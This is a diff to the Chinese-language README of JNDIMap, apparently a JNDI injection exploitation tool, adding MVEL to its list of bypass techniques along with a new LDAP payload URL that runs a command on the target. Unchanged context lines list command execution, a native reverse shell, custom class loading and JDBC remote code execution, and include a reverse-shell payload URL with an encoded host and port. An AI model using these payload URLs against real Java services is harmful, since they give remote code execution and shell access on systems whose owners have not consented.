@@ -10,7 +10,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI, LDAP 和 LDAPS 协议, �
 - 命令执行
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
-- Tomcat/Groovy/SnakeYaml Bypass
+- Tomcat/Groovy/SnakeYaml/MVEL Bypass
 - Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Class
@@ -102,6 +102,7 @@ ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
 - Tomcat ELProcessor
 - Groovy ClassLoader/Shell
 - SnakeYaml
+- MVEL
 
 上述方式均依赖于 BeanFactory, 因此 Tomcat 版本需小于 8.5.79 或 9.0.63
 
@@ -115,6 +116,9 @@ ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
 # SnakeYaml Bypass
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+
+# MVEL Bypass
+ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
 ```
 
 ### MLet
